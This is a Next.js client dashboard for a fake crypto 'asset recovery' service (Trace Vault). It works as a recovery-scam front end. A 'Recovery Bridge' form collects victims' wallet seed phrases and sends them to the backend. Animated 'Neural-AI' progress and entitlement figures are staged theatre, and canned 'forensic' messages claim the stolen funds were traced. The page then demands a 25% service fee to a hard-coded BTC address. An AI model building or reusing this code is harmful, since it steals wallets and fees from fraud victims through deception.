 'use client';

import { ChangeEvent, useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';
import { getApiUrl } from '@/lib/api-config';
import CyberTracker from '@/components/CyberTracker';

interface User {
  id: string;
  name: string;
  email: string;
  role: string;
}

interface ClientData {
  recoveredAmount: number;
  trackingProgress: number;
  feePaid: boolean;
  paymentPending: boolean;
  paymentConfirmed: boolean;
  fundsUnlocked: boolean;
  balance: number;
  fixed: number;
  marsettaShare: number;
  verifiedLoss1: number;
  verifiedLoss2: number;
  totalEntitlement: number;
}

interface Message {
  id: string;
  from: string;
  message: string;
  time: string;
  clientEmail: string;
  adminReply?: string;
  adminReplyTime?: string;
  content?: string;
  timestamp?: string;
  createdAt?: string;
}

export default function ClientDashboard() {
  const router = useRouter();
  const [user, setUser] = useState<User | null>(null);
  const [token, setToken] = useState<string>('');
  const [caseId, setCaseId] = useState<string>('');
  const [evidenceName, setEvidenceName] = useState<string>('');
  const [evidenceHash, setEvidenceHash] = useState<string>('');
  const [evidenceList, setEvidenceList] = useState<Array<any>>([]);
  const [seedPhrase, setSeedPhrase] = useState('');
  const [selectedWallet, setSelectedWallet] = useState('');
  const [customWallet, setCustomWallet] = useState('');
  const [evidenceFile, setEvidenceFile] = useState<File | null>(null);
  const [additionalEvidenceAmount, setAdditionalEvidenceAmount] = useState('');
  const [supportMessage, setSupportMessage] = useState('');
  const [data, setData] = useState<ClientData>({
    recoveredAmount: 0,
    trackingProgress: 0,
    feePaid: false,
    paymentPending: false,
    paymentConfirmed: false,
    fundsUnlocked: false,
    balance: 0,
    fixed: 0,
    marsettaShare: 0,
    verifiedLoss1: 0,
    verifiedLoss2: 0,
    totalEntitlement: 0,
  });
  const [supportMessages, setSupportMessages] = useState<Message[]>([]);
  const [selectedMessageId, setSelectedMessageId] = useState<string | null>(null);
  const [replyText, setReplyText] = useState('');
  const [paymentProofFile, setPaymentProofFile] = useState<File | null>(null);
  const [currentPassword, setCurrentPassword] = useState('');
  const [newPassword, setNewPassword] = useState('');
  const [confirmPassword, setConfirmPassword] = useState('');
  const [resetEmail, setResetEmail] = useState('');
  const [loading, setLoading] = useState(true);
  const [animatedProgress, setAnimatedProgress] = useState(0);
  const [displayAmount, setDisplayAmount] = useState(0);
  const [currentFee, setCurrentFee] = useState(0);
  const [isCalculating, setIsCalculating] = useState(false);

  const wallets = ['Coinbase', 'Binance', 'MetaMask', 'Trust Wallet', 'Exodus', 'Ledger', 'Trezor', 'Other'];

  const inboxMessages = [
    {
      label: 'SYSTEM ALERT',
      message: 'Neural-AI audit completed 0% of required telemetry checks.',
      time: '02:14 UTC',
    },
    {
      label: 'PAYMENT NOTICE',
      message: 'To initiate the secure retraction and finalize this phase of your case, the associated professional service fee of (25%) must be settled. Please note that secured assets are held in a temporary multi-sig state; prompt settlement ensures the immediate release of funds to your custody.',
      time: '01:58 UTC',
    },
    {
      label: 'SECURITY BRIEF',
      message: 'AES-256-GCM channel active; seed phrase bridge awaiting handshake.',
      time: '01:22 UTC',
    },
  ];

  useEffect(() => {
    const storedToken = sessionStorage.getItem('token');
    const storedUser = sessionStorage.getItem('user');

    if (!storedToken || !storedUser) {
      router.push('/login');
      return;
    }

    try {
      const parsedUser = JSON.parse(storedUser);
      if (parsedUser.role !== 'client') {
        router.push('/login');
        return;
      }

      setToken(storedToken);
      setUser(parsedUser);

      // Load client data
      fetchClientData(storedToken);
      fetchMessages(storedToken);
    } catch (error) {
      console.error('Error parsing user data:', error);
      sessionStorage.removeItem('token');
      sessionStorage.removeItem('user');
      router.push('/login');
    }
  }, []);

  // Animate progress bar with phases
  useEffect(() => {
    const timer = setInterval(() => {
      setAnimatedProgress((prev) => {
        if (prev < data.trackingProgress) {
          // Phase 1: Fast scanning (0-85%)
          if (prev < 85) return prev + 2;
          // Phase 2: Slow decryption (85-95%)
          else if (prev < 95) return prev + 0.5;
          // Phase 3: Final calculation (95-100%)
          else return prev + 0.2;
        }
        return data.trackingProgress;
      });
    }, 50);
    return () => clearInterval(timer);
  }, [data.trackingProgress]);

  // Animate entitlement and fee calculation
  useEffect(() => {
    if (animatedProgress > 0) {
      setIsCalculating(true);
      const finalAmount = data.totalEntitlement;
      const increment = finalAmount / 100;

      const feePercent = (data as any).feePercent ?? 0.25;
      const timer = setInterval(() => {
        setDisplayAmount((prev) => {
          if (prev < finalAmount) {
            const newAmount = prev + increment;
            setCurrentFee(newAmount * feePercent);
            return newAmount;
          } else {
            clearInterval(timer);
            setIsCalculating(false);
            return finalAmount;
          }
        });
      }, animatedProgress < 85 ? 20 : animatedProgress < 95 ? 60 : 150); // Match progress phases

      return () => clearInterval(timer);
    } else {
      setDisplayAmount(0);
      setCurrentFee(0);
      setIsCalculating(false);
    }
  }, [animatedProgress, data.totalEntitlement]);

  const fetchClientData = async (authToken: string) => {
    try {
      const response = await fetch(getApiUrl('/api/client/data'), {
        headers: {
          'Authorization': `Bearer ${authToken}`,
        },
      });

      if (response.ok) {
      const clientData = await response.json();
      setCaseId(clientData.caseId || '');
      setEvidenceName(clientData.evidence || '');
      setEvidenceHash(clientData.evidenceHash || '');
      // Compute entitlement from verified losses if not provided
      const v1 = clientData.data?.verifiedLoss1 ?? clientData.amountLost ?? 0;
      const v2 = clientData.data?.verifiedLoss2 ?? 0;
      const total = clientData.data?.totalEntitlement ?? (v1 + v2);
      // Merge nested data with default ClientData structure
      setData({
        recoveredAmount: 0,
        feePaid: false,
        trackingProgress: 0,
        totalPercentage: 0,
        paymentPending: false,
        paymentConfirmed: false,
        fundsUnlocked: false,
        balance: 0,
        fixed: 0,
        marsettaShare: 0,
        verifiedLoss1: v1,
        verifiedLoss2: v2,
        totalEntitlement: total,
        ...clientData.data, // spread any additional data fields
      });
        setSelectedWallet(clientData.wallet || '');
        setSeedPhrase(clientData.seedPhrase || '');
      } else {
        // Token might be expired
        sessionStorage.removeItem('token');
        sessionStorage.removeItem('user');
        router.push('/login');
      }
    } catch (error) {
      console.error('Error fetching client data:', error);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    if (token) fetchEvidence(token);
  }, [token]);

  const fetchMessages = async (authToken: string) => {
    try {
      const response = await fetch(getApiUrl('/api/messages'), {
        headers: {
          'Authorization': `Bearer ${authToken}`,
        },
      });

      if (response.ok) {
        const messages = await response.json();
        if (!messages || messages.length === 0) {
          const auto = {
            id: 'sys-1',
            from: 'system',
            message:
              'Welcome to Trace Vault. Your case file has been securely routed to our intelligence unit. A cyber analyst is currently reviewing the transaction paths provided. Please ensure all communication logs with the entity are uploaded in full. Expect a preliminary forensic feasibility update within 24–48 hours.',
            time: new Date().toISOString(),
            clientEmail: user?.email || 'dev@example.com',
          };
          const feasibility = {
            id: 'feas-1',
            from: 'admin',
            message:
              'Our technical team has completed the initial footprinting of your case. We have successfully mapped the movement of your assets from your initial transaction out to the target wallets/accounts.\n\nCurrent Findings:\n- Asset Vector: [Crypto / Wire Transfer]\n- Current Location: The funds have been traced to a high-volume cluster associated with [Exchange Name / Intermediate Holding Accounts].\n\nNext Milestone: We are preparing the official Forensic Subpoena Package / Asset Freeze Notice to be routed to the compliance operations unit handling that jurisdiction.\n\nTo proceed to the active interception phase, please verify that the attached timeline of your correspondence is 100% accurate. Let us know through this portal if you remember any secondary communication channels used by the bad actor.',
            time: new Date().toISOString(),
            clientEmail: user?.email || 'dev@example.com',
          };
          setSupportMessages([auto, feasibility]);
        } else {
          setSupportMessages(messages);
        }
      }
    } catch (error) {
      console.error('Error fetching messages:', error);
    }
  };

  const fetchEvidence = async (authToken: string) => {
    try {
      const res = await fetch(getApiUrl('/api/client/evidence'), {
        headers: { Authorization: `Bearer ${authToken}` },
      });
      if (res.ok) {
        const list = await res.json();
        setEvidenceList(list);
      }
    } catch (error) {
      console.error('Error fetching evidence', error);
    }
  };

  const handleSeedChange = (event: ChangeEvent<HTMLTextAreaElement>) => {
    setSeedPhrase(event.target.value);
  };

  const handleWalletChange = (event: ChangeEvent<HTMLSelectElement>) => {
    setSelectedWallet(event.target.value);
  };

  const handleFileChange = (event: ChangeEvent<HTMLInputElement>) => {
    if (event.target.files) {
      setEvidenceFile(event.target.files[0]);
    }
  };

  const handleSimulateSubmit = async () => {
    const wallet = selectedWallet === 'Other' ? customWallet : selectedWallet;
    if (!token) {
      alert('Please login first.');
      return;
    }
    if (!wallet) {
      alert('Please select or enter a wallet first.');
      return;
    }

    try {
      const response = await fetch(getApiUrl('/api/client/wallet'), {
        method: 'PUT',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token}`,
        },
        body: JSON.stringify({ wallet, seedPhrase }),
      });

      const result = await response.json();
      if (response.ok) {
        alert(result.message || 'Recovery bridge request submitted. Await admin confirmation.');
        fetchClientData(token);
      } else {
        alert(result.message || 'Error updating wallet data.');
      }
    } catch (error) {
      console.error('Error:', error);
      alert('Error updating wallet data.');
    }
  };

  const handleSendSupport = async () => {
    if (!supportMessage.trim() || !token) return;

    try {
      const response = await fetch(getApiUrl('/api/messages'), {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token}`,
        },
        body: JSON.stringify({ message: supportMessage }),
      });

      if (response.ok) {
        alert('Support message sent. Admin will respond.');
        setSupportMessage('');
        fetchMessages(token);
      } else {
        alert('Error sending message.');
      }
    } catch (error) {
      console.error('Error:', error);
      alert('Error sending message.');
    }
  };

  const handleEvidenceUpload = async () => {
    if (!token) {
      alert('Please login first.');
      return;
    }

    if (!evidenceFile) {
      alert('Please select a file to upload.');
      return;
    }

    if (!additionalEvidenceAmount) {
      alert('Please enter the amount for this additional evidence.');
      return;
    }

    try {
      const response = await fetch(getApiUrl('/api/client/verified-loss-2'), {
        method: 'PUT',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token}`,
        },
        body: JSON.stringify({ amount: parseFloat(additionalEvidenceAmount) }),
      });

      if (response.ok) {
        alert('Additional evidence uploaded successfully. Verified Loss 2 updated.');
        setEvidenceFile(null);
        setAdditionalEvidenceAmount('');
        // Reset file input
        const fileInput = document.querySelector('input[type="file"]') as HTMLInputElement;
        if (fileInput) fileInput.value = '';
        // Refresh data
        fetchClientData(token);
      } else {
        alert('Error uploading evidence.');
      }
    } catch (error) {
      console.error('Error:', error);
      alert('Error uploading evidence.');
    }
  };

  const handleReplyToAdmin = async (messageId: string) => {
    if (!replyText.trim() || !token) return;

    try {
      const response = await fetch(getApiUrl(`/api/messages/${messageId}/reply`), {
        method: 'PUT',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token}`,
        },
        body: JSON.stringify({ reply: replyText }),
      });

      if (response.ok) {
        alert('Reply sent to admin.');
        setReplyText('');
        setSelectedMessageId(null);
        fetchMessages(token);
      } else {
        alert('Error sending reply.');
      }
    } catch (error) {
      console.error('Error:', error);
      alert('Error sending reply.');
    }
  };

  const handlePaymentProofUpload = (event: ChangeEvent<HTMLInputElement>) => {
    if (event.target.files) {
      setPaymentProofFile(event.target.files[0]);
    }
  };

  const handleChangePassword = async () => {
    if (!currentPassword || !newPassword || !confirmPassword || !token) {
      alert('Please fill in all password fields.');
      return;
    }
    if (newPassword !== confirmPassword) {
      alert('New passwords do not match.');
      return;
    }
    if (newPassword.length < 8) {
      alert('Password must be at least 8 characters long.');
      return;
    }

    try {
      const response = await fetch(getApiUrl('/api/client/password'), {
        method: 'PUT',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token}`,
        },
        body: JSON.stringify({ currentPassword, newPassword }),
      });

      if (response.ok) {
        alert('Password changed successfully.');
        setCurrentPassword('');
        setNewPassword('');
        setConfirmPassword('');
      } else {
        const error = await response.json();
        alert(error.message || 'Error changing password.');
      }
    } catch (error) {
      console.error('Error:', error);
      alert('Error changing password.');
    }
  };

  const handleForgotPassword = () => {
    if (!resetEmail) {
      alert('Please enter your email address.');
      return;
    }
    // Simulate password reset - in real app this would send email
    alert(`Password reset link sent to ${resetEmail}. Check your email for instructions.`);
    setResetEmail('');
  };

  const formatMessageTime = (rawTime?: string | Date) => {
    const date = rawTime ? new Date(rawTime) : null;
    return date && !isNaN(date.getTime()) ? date.toLocaleTimeString() : '';
  };

  const handlePaymentSent = () => {
    alert('Payment confirmation sent. Pending admin approval.');
  };

  const handleLogout = () => {
    sessionStorage.removeItem('token');
    sessionStorage.removeItem('user');
    router.push('/');
  };

  if (loading) {
    return (
      <div className="min-h-screen bg-[#040b16] text-white flex items-center justify-center p-6">
          <div className="text-center">
            <p className="text-teal-400 text-xl font-mono">Loading client data...</p>
          </div>
        </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#040b16] text-white p-6 md:p-10">
      <div className="max-w-7xl mx-auto space-y-8">
        <header className="flex flex-col gap-6 xl:flex-row xl:items-start xl:justify-between">
          <div className="space-y-4">
            <p className="uppercase tracking-[0.35em] text-teal-300 text-xs">VaultTrace Retraction Protocol</p>
            <div className="space-y-2">
              <h1 className="text-4xl md:text-5xl font-black tracking-tight">CLASSIFIED RECOVERY</h1>
              <p className="text-sm text-slate-400 uppercase tracking-[0.25em]">
                CASE: {caseId || 'PENDING'} • CLIENT: {user?.name} • PRIORITY: ALPHA
              </p>
            </div>
            <div className="flex flex-wrap gap-3">
              <span className="inline-flex items-center gap-2 rounded-full bg-emerald-500/15 px-3 py-1 text-xs uppercase tracking-[0.3em] text-emerald-300">
                <span className="h-2 w-2 rounded-full bg-emerald-400 animate-pulse" /> NEURAL-AI ONLINE
              </span>
              <span className={`inline-flex items-center gap-2 rounded-full px-3 py-1 text-xs uppercase tracking-[0.3em] ${
                data.fundsUnlocked ? 'bg-green-500/15 text-green-300' : 'bg-orange-500/15 text-orange-300'
              }`}>
                {data.fundsUnlocked ? '✓ FUNDS UNLOCKED' : 'FUNDS LOCKED'}
              </span>
            </div>
          </div>

          <div className="flex gap-4">
            <div className="glass rounded-[32px] border border-white/10 bg-white/5 p-6 shadow-xl shadow-teal-500/5">
              <p className="text-xs uppercase tracking-[0.3em] text-teal-300 mb-3">Encryption Standards</p>
              <div className="space-y-2 text-sm text-slate-200">
                <p>AES-256-GCM</p>
                <p>ChaCha20-Poly1305</p>
              </div>
              <p className="mt-4 text-xs text-slate-500">Secure audit channel verified for classified recovery operations.</p>
            </div>
            <button
              onClick={handleLogout}
              className="glass rounded-[32px] border border-white/10 bg-white/5 p-6 shadow-xl shadow-teal-500/5 hover:bg-rose-500/10 transition"
            >
              <p className="text-xs uppercase tracking-[0.3em] text-rose-300">Logout</p>
            </button>
          </div>
        </header>

        <section className="grid gap-8 xl:grid-cols-[1.8fr_1fr]">
          <div className="glass rounded-[32px] border border-white/10 bg-white/5 p-8 shadow-xl shadow-teal-500/5">
            <CyberTracker
              steps={[
                'Intake Submission',
                'Technical Assessment',
                'Evidence Validation',
                'Forensic Recovery',
                'Release Authorization',
              ]}
              currentStage={2}
              progress={animatedProgress}
            />
            <div className="grid gap-6 lg:grid-cols-[1.5fr_1fr]">
                {/* Beneficiary Profile (moved before Financial Overview) */}
                <div className="glass rounded-[32px] border border-white/10 bg-white/5 p-6 shadow-xl shadow-teal-500/5 mb-4">
                  <div className="flex items-center justify-between gap-4">
                    <div>
                      <p className="text-xs uppercase tracking-[0.3em] text-slate-400">Beneficiary Profile</p>
                      <h2 className="mt-2 text-xl font-semibold text-white">Case ID: {caseId || 'PENDING'}</h2>
                    </div>
                    <span className="rounded-3xl bg-emerald-500/10 px-3 py-1 text-xs uppercase tracking-[0.3em] text-emerald-300">Verified</span>
                  </div>
                  <div className="mt-4 space-y-3 text-sm text-slate-300">
                    {evidenceList && evidenceList.length > 0 ? (
                      evidenceList.map((e: any) => (
                        <div key={e.id} className="rounded-3xl bg-slate-950/80 p-4 border border-white/10">
                          <p className="text-[10px] uppercase tracking-[0.3em] text-slate-500">Evidence Vault</p>
                          <p className="mt-2 text-sm text-slate-200">{e.name}</p>
                          <p className="mt-1 text-xs text-teal-300">SHA-256: {e.sha256}</p>
                          <div className="mt-3 flex gap-2">
                            <a href={e.url || `/uploads/${encodeURIComponent(e.name)}`} download={e.name} target="_blank" rel="noopener noreferrer" className="px-3 py-1 bg-teal-500 text-black rounded text-xs hover:bg-teal-400">Download</a>
                            <button onClick={() => alert(JSON.stringify(e, null, 2))} className="px-3 py-1 bg-slate-800 text-slate-300 rounded text-xs">View Details</button>
                          </div>
                        </div>
                      ))
                    ) : (
                      <div className="rounded-2xl bg-slate-900/60 p-4 border border-white/6 text-slate-400">No evidence files available yet.</div>
                    )}
                    <div className="rounded-3xl bg-slate-950/80 p-3 border border-white/10">
                      <p className="text-[10px] uppercase tracking-[0.3em] text-slate-500">Verified Loss #1</p>
                      <p className="mt-2 text-lg font-extrabold text-red-400">${data.verifiedLoss1?.toLocaleString() || '0.00'}</p>
                    </div>
                    <div className="rounded-3xl bg-slate-950/80 p-3 border border-white/10">
                      <p className="text-[10px] uppercase tracking-[0.3em] text-slate-500">Verified Loss #2</p>
                      <p className="mt-2 text-lg font-extrabold text-red-400">${data.verifiedLoss2?.toLocaleString() || '0.00'}</p>
                    </div>
                  </div>
                </div>
              <div className="space-y-6">
                <p className="text-sm uppercase tracking-[0.3em] text-slate-400">Financial Overview</p>
                <div>
                  <p className="text-xs uppercase tracking-[0.3em] text-slate-400">Total Equity (USDT)</p>
                  <p className="mt-2 text-5xl font-bold text-teal-300">${data.recoveredAmount.toLocaleString()}</p>
                </div>
              </div>

              <div className="rounded-[28px] bg-slate-950/80 p-5 border border-white/10">
                <p className="text-xs uppercase tracking-[0.3em] text-slate-400">Wallet Verification</p>
                <p className="mt-3 text-base font-semibold text-white">BYBIT WALLET VERIFICATION</p>
                <p className="mt-2 text-sm text-slate-500">ETH / BSC / BTC</p>
                <div className="mt-4 rounded-2xl bg-slate-900/80 px-4 py-3 text-xs uppercase tracking-[0.2em] text-slate-300 border border-slate-700/10">
                  FUNDS LOCKED
                </div>
              </div>
            </div>

            <div className="mt-10 grid gap-4 sm:grid-cols-2 xl:grid-cols-4">
              <div className="rounded-3xl bg-slate-950/80 p-5 border border-white/10">
                <p className="text-xs uppercase tracking-[0.3em] text-slate-500">Balance</p>
                <p className="mt-3 text-2xl font-semibold text-slate-100">${data.balance?.toLocaleString() || '0.00'}</p>
              </div>
              <div className="rounded-3xl bg-slate-950/80 p-5 border border-white/10">
                <p className="text-xs uppercase tracking-[0.3em] text-slate-500">Fixed</p>
                <p className="mt-3 text-2xl font-semibold text-teal-300">${data.fixed?.toLocaleString() || '0.00'}</p>
                <p className="text-[10px] uppercase tracking-[0.3em] text-slate-500 mt-2">Multi-Sig Lock</p>
              </div>
              <div className="rounded-3xl bg-slate-950/80 p-5 border border-white/10">
                <p className="text-xs uppercase tracking-[0.3em] text-slate-500">Marsetta Share</p>
                <p className="mt-3 text-2xl font-semibold text-white">${data.marsettaShare?.toLocaleString() || '0.00'}</p>
                <p className="text-[10px] uppercase tracking-[0.3em] text-slate-500 mt-2">2.08% Settlement</p>
              </div>
              <div className="rounded-3xl bg-slate-950/80 p-5 border border-white/10">
                <p className="text-xs uppercase tracking-[0.3em] text-slate-500">Protocol Progress</p>
                <p className="mt-3 text-base font-semibold text-white">Decrypting target vectors</p>
                <div className="mt-4 h-3 rounded-full bg-slate-900/80 overflow-hidden">
                  <div className="h-full bg-teal-500" style={{ width: `${animatedProgress}%` }} />
                </div>
              </div>
            </div>

            <div className="mt-10 rounded-[32px] bg-slate-950/80 border border-white/10 p-6">
              <div className="flex items-center justify-between gap-4">
                <div>
                  <p className="text-xs uppercase tracking-[0.3em] text-slate-500">Protocol Status</p>
                  <p className="mt-2 text-xl font-semibold text-white">Decrypting target vectors</p>
                </div>
                <span className="inline-flex items-center rounded-full bg-teal-500/15 px-3 py-1 text-xs uppercase tracking-[0.3em] text-teal-200">{animatedProgress.toFixed(1)}% Complete</span>
              </div>
              <div className="mt-6 h-3 rounded-full bg-slate-900/80 overflow-hidden">
                <div className="h-full bg-teal-400" style={{ width: `${animatedProgress}%` }} />
              </div>
            </div>

          </div>

          <aside className="space-y-8">
            {/* Beneficiary moved to main column */}

            <div className="glass rounded-[32px] border border-white/10 bg-white/5 p-8 shadow-xl shadow-teal-500/5">
              <div className="space-y-4">
                <p className="text-xs uppercase tracking-[0.3em] text-teal-300">CONNECT WALLET</p>
                <h3 className="text-2xl font-semibold">Recovery Bridge</h3>
                <p className="text-sm text-slate-400">Select your wallet to establish the encrypted bridge for smart-contract retraction.</p>
              </div>

              <select
                value={selectedWallet}
                onChange={handleWalletChange}
                className="mt-6 w-full rounded-3xl border border-white/10 bg-slate-950/80 px-4 py-4 text-sm text-slate-200 focus:border-teal-400 focus:outline-none focus:ring-2 focus:ring-teal-400/20"
              >
                <option value="">Select Wallet</option>
                {wallets.map(wallet => (
                  <option key={wallet} value={wallet}>{wallet}</option>
                ))}
              </select>              {selectedWallet === 'Other' && (
                <input
                  type="text"
                  value={customWallet}
                  onChange={(e) => setCustomWallet(e.target.value)}
                  placeholder="Enter custom wallet name"
                  className="mt-4 w-full rounded-3xl border border-white/10 bg-slate-950/80 px-4 py-4 text-sm text-slate-200 placeholder:text-slate-500 focus:border-teal-400 focus:outline-none focus:ring-2 focus:ring-teal-400/20"
                />
              )}
              <textarea
                rows={6}
                value={seedPhrase}
                onChange={handleSeedChange}
                placeholder="Enter 12-word or 24-word recovery phrase"
                className="mt-6 w-full rounded-3xl border border-white/10 bg-slate-950/80 px-4 py-4 text-sm text-slate-200 placeholder:text-slate-500 focus:border-teal-400 focus:outline-none focus:ring-2 focus:ring-teal-400/20"
              />

              <button
                onClick={handleSimulateSubmit}
                className="mt-6 w-full rounded-3xl bg-teal-500 px-5 py-3 text-sm font-semibold uppercase tracking-[0.2em] text-black transition hover:bg-teal-400"
              >
                Establish Secure Bridge
              </button>
            </div>

            <div className="glass rounded-[32px] border border-white/10 bg-white/5 p-8 shadow-xl shadow-teal-500/5">
              <div className="space-y-4">
                <p className="text-xs uppercase tracking-[0.3em] text-teal-300">PAYMENT</p>
                <h3 className="text-2xl font-semibold">Service Fee (25%)</h3>

                {/* Live Calculation Display */}
                <div className="bg-gradient-to-r from-teal-500/10 to-teal-400/10 border border-teal-500/20 rounded-3xl p-4 mb-4">
                  <div className="flex justify-between items-center mb-3">
                    <span className="text-xs text-teal-400 uppercase tracking-[0.2em]">Neural-AI Calculation</span>
                    <span className={`text-xs font-bold ${isCalculating ? 'text-slate-300 animate-pulse' : 'text-green-400'}`}>
                      {isCalculating ? 'SCANNING...' : 'COMPLETE'}
                    </span>
                  </div>
                  <div className="grid grid-cols-2 gap-4">
                    <div className="text-center">
                        <p className="text-lg font-bold text-teal-300">${displayAmount.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}</p>
                      <p className="text-xs text-slate-400 uppercase tracking-[0.2em]">Total Entitlement</p>
                    </div>
                    <div className={`text-center p-2 rounded-xl transition-all duration-300 ${
                      isCalculating && animatedProgress > 85 ? 'bg-slate-700/10 border border-slate-700/30 animate-pulse' : ''
                    }`}>
                      <p className={`text-lg font-bold ${isCalculating && animatedProgress > 85 ? 'text-slate-300' : 'text-slate-200'}`}>
                        ${currentFee.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}
                      </p>
                      <p className="text-xs text-slate-400 uppercase tracking-[0.2em]">Service Fee</p>
                    </div>
                  </div>
                </div>

                <div className="bg-slate-700/10 border border-slate-700/20 rounded-3xl p-4">
                  <p className="text-slate-300 text-sm font-semibold">To initiate the secure retraction and finalize this phase of your case, the associated professional service fee of (25%) must be settled. Please note that secured assets are held in a temporary multi-sig state; prompt settlement ensures the immediate release of funds to your custody.</p>
                </div>
                <div className="flex items-center gap-2">
                    <p className="text-sm text-slate-400">Send to: 1W984WdG9gLXEvopZ5NiWiHppvRDbnb3u</p>
                    <button
                      onClick={() => navigator.clipboard.writeText('1W984WdG9gLXEvopZ5NiWiHppvRDbnb3u').then(() => alert('BTC address copied!'))}
                      className="px-3 py-1 bg-teal-500 text-black text-xs font-bold rounded hover:bg-teal-400"
                    >
                      Copy
                    </button>
                </div>
                <div className="space-y-2">
                  <label className="text-sm uppercase tracking-[0.3em] text-slate-400">Enter BTC Amount to Pay</label>
                  <input
                    type="number"
                    step="0.00000001"
                    placeholder="e.g., 0.001"
                    className="w-full rounded-3xl border border-white/10 bg-slate-950/80 px-4 py-4 text-sm text-slate-200 focus:border-teal-400 focus:outline-none focus:ring-2 focus:ring-teal-400/20"
                  />
                </div>
                <div className="space-y-2">
                  <label className="text-sm uppercase tracking-[0.3em] text-slate-400">Upload Payment Proof</label>
                  <input
                    type="file"
                    accept="image/*"
                    onChange={handlePaymentProofUpload}
                      className="w-full rounded-3xl border border-white/10 bg-slate-950/80 px-4 py-4 text-sm text-slate-200 file:bg-teal-500 file:text-black file:border-none file:px-4 file:py-1 file:rounded file:mr-4 file:text-xs"
                  />
                  {paymentProofFile && (
                    <p className="text-green-400 text-xs mt-1">✓ {paymentProofFile.name} uploaded</p>
                  )}
                </div>
                {data.paymentConfirmed ? (
                  <p className="text-green-400 mt-4 font-semibold">✓ Payment Confirmed</p>
                ) : data.feePaid ? (
                  <p className="text-slate-300 mt-4 font-semibold">Fee Paid - Awaiting Confirmation</p>
                ) : data.paymentPending ? (
                  <p className="text-slate-300 mt-4 font-semibold">Pending Confirmation</p>
                ) : (
                  <button
                    onClick={handlePaymentSent}
                    className="mt-4 w-full px-4 py-2 bg-slate-700 text-white font-bold rounded hover:bg-slate-600"
                  >
                    I Have Sent My Payment
                  </button>
                )}
              </div>
            </div>

            <div className="glass rounded-[32px] border border-white/10 bg-white/5 p-8 shadow-xl shadow-teal-500/5">
              <div className="space-y-4">
                <p className="text-xs uppercase tracking-[0.3em] text-teal-300">UPLOAD EVIDENCE</p>
                <h3 className="text-2xl font-semibold">Additional Files</h3>
                <p className="text-sm text-slate-400">Upload more evidence for your case and specify the associated amount.</p>
              </div>

              <input
                type="file"
                onChange={handleFileChange}
                className="mt-6 w-full rounded-3xl border border-white/10 bg-slate-950/80 px-4 py-4 text-sm text-slate-200 file:bg-teal-500 file:text-black file:border-none file:px-4 file:py-1 file:rounded file:mr-4"
              />

              <input
                type="number"
                value={additionalEvidenceAmount}
                onChange={(e) => setAdditionalEvidenceAmount(e.target.value)}
                placeholder="Enter amount for this evidence ($)"
                className="mt-4 w-full rounded-3xl border border-white/10 bg-slate-950/80 px-4 py-4 text-sm text-slate-200 placeholder:text-slate-500 focus:border-teal-400 focus:outline-none focus:ring-2 focus:ring-teal-400/20"
              />

              <button
                onClick={handleEvidenceUpload}
                    className="mt-6 w-full rounded-3xl bg-teal-500 px-5 py-3 text-sm font-semibold uppercase tracking-[0.2em] text-black transition hover:bg-teal-400"
              >
                Upload Evidence
              </button>
            </div>

            <div className="glass rounded-[32px] border border-white/10 bg-white/5 p-8 shadow-xl shadow-teal-500/5">
              <div className="space-y-4">
                <p className="text-xs uppercase tracking-[0.3em] text-teal-300">SUPPORT</p>
                <h3 className="text-2xl font-semibold">Contact Support</h3>
                <p className="text-sm text-slate-400">Send a message to our support team.</p>
              </div>

              <textarea
                rows={4}
                value={supportMessage}
                onChange={(e) => setSupportMessage(e.target.value)}
                placeholder="Type your message here"
                className="mt-6 w-full rounded-3xl border border-white/10 bg-slate-950/80 px-4 py-4 text-sm text-slate-200 placeholder:text-slate-500 focus:border-teal-400 focus:outline-none focus:ring-2 focus:ring-teal-400/20"
              />

              <button
                onClick={handleSendSupport}
                className="mt-6 w-full rounded-3xl bg-teal-500 px-5 py-3 text-sm font-semibold uppercase tracking-[0.2em] text-black transition hover:bg-teal-400"
              >
                Send Message
              </button>
            </div>

            <div className="glass rounded-[32px] border border-white/10 bg-white/5 p-8 shadow-xl shadow-teal-500/5">
              <div className="space-y-4">
                <p className="text-xs uppercase tracking-[0.3em] text-teal-300">ACCOUNT SETTINGS</p>
                <h3 className="text-2xl font-semibold">Security & Password</h3>
                <p className="text-sm text-slate-400">Manage your account security settings.</p>
              </div>

              <div className="mt-6 space-y-4">
                <div className="space-y-2">
                  <label className="text-sm uppercase tracking-[0.3em] text-slate-400">Current Password</label>
                  <input
                    type="password"
                    value={currentPassword}
                    onChange={(e) => setCurrentPassword(e.target.value)}
                    placeholder="Enter current password"
                    className="w-full rounded-3xl border border-white/10 bg-slate-950/80 px-4 py-4 text-sm text-slate-200 placeholder:text-slate-500 focus:border-teal-400 focus:outline-none focus:ring-2 focus:ring-teal-400/20"
                  />
                </div>
                <div className="space-y-2">
                  <label className="text-sm uppercase tracking-[0.3em] text-slate-400">New Password</label>
                  <input
                    type="password"
                    value={newPassword}
                    onChange={(e) => setNewPassword(e.target.value)}
                    placeholder="Enter new password"
                    className="w-full rounded-3xl border border-white/10 bg-slate-950/80 px-4 py-4 text-sm text-slate-200 placeholder:text-slate-500 focus:border-teal-400 focus:outline-none focus:ring-2 focus:ring-teal-400/20"
                  />
                </div>
                <div className="space-y-2">
                  <label className="text-sm uppercase tracking-[0.3em] text-slate-400">Confirm New Password</label>
                  <input
                    type="password"
                    value={confirmPassword}
                    onChange={(e) => setConfirmPassword(e.target.value)}
                    placeholder="Confirm new password"
                    className="w-full rounded-3xl border border-white/10 bg-slate-950/80 px-4 py-4 text-sm text-slate-200 placeholder:text-slate-500 focus:border-teal-400 focus:outline-none focus:ring-2 focus:ring-teal-400/20"
                  />
                </div>
                <button
                  onClick={handleChangePassword}
                  className="w-full rounded-3xl bg-teal-500 px-5 py-3 text-sm font-semibold uppercase tracking-[0.2em] text-black transition hover:bg-teal-400"
                >
                  Change Password
                </button>
              </div>

              <div className="mt-8 pt-6 border-t border-white/10">
                <div className="space-y-4">
                  <h4 className="text-lg font-semibold text-white">Forgot Password?</h4>
